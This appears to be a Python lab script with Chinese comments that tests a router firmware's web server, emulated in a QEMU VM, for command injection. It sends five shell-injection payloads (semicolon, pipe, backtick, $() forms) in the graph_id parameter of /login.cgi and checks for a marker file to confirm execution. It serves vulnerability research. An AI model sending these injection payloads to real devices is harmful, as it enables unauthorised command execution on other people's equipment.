"""用 qemu 里的固件验证：/login.cgi 的 graph_id 是否真的进了 system()。

思路：注入一条会留下文件的命令，再回读文件。留痕比"崩了"强得多 ——
崩只能说明路径不对，文件存在说明命令真的被执行了。

    py -3 lab/attack_login.py
"""

import sys

import vm

ROOT = "/home/ubuntu/lab/d615/root"
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SCRIPT = r"""
set -u
R=/home/ubuntu/lab/d615/root

cat > /tmp/atk.py <<'PY'
import socket, sys, urllib.parse

def req(path):
    s = socket.create_connection(("127.0.0.1", 80), 5)
    s.sendall(("GET %s HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" % path).encode())
    d = b""
    try:
        while True:
            c = s.recv(8192)
            if not c: break
            d += c
    except OSError: pass
    s.close()
    return len(d)

payloads = [
    ("分号",        "1;id>/tmp/fwmap_pwn"),
    ("分号+空格",    "1; id >/tmp/fwmap_pwn"),
    ("反引号",      "1`id>/tmp/fwmap_pwn`"),
    ("美元括号",    "1$(id>/tmp/fwmap_pwn)"),
    ("竖线",        "1|id>/tmp/fwmap_pwn"),
]
for name, p in payloads:
    q = urllib.parse.quote(p, safe="")
    n = req("/login.cgi?graph_id=" + q)
    print(f"  {name:10s} graph_id={p!r:34s} -> {n} 字节")
PY

start() {
  pkill -9 -x httpd 2>/dev/null; sleep 0.5
  rm -f $R/tmp/fwmap_pwn
  ( chroot $R /sbin/httpd -h /www -p 80 >/tmp/atk.log 2>&1 & )
  for i in $(seq 1 25); do
    (echo > /dev/tcp/127.0.0.1/80) >/dev/null 2>&1 && break
    sleep 0.2
  done
}

echo "== 注入测试 =="
start
python3 /tmp/atk.py
sleep 1
echo
echo "== 留痕检查 =="
if [ -f $R/tmp/fwmap_pwn ]; then
  echo "  ✅ 命令被执行了！文件内容："
  cat $R/tmp/fwmap_pwn
else
  echo "  ❌ 没有文件 —— 命令没被执行（或注入被过滤）"
fi
echo "  进程=$(pgrep -x httpd >/dev/null && echo up || echo down)"
pkill -9 -x httpd 2>/dev/null
exit 0
"""

_rc, out, err = vm.run(SCRIPT, timeout=300, sudo=True)
sys.stdout.write(out)
if err.strip():
    sys.stderr.write("\n--- stderr ---\n" + err[-300:])
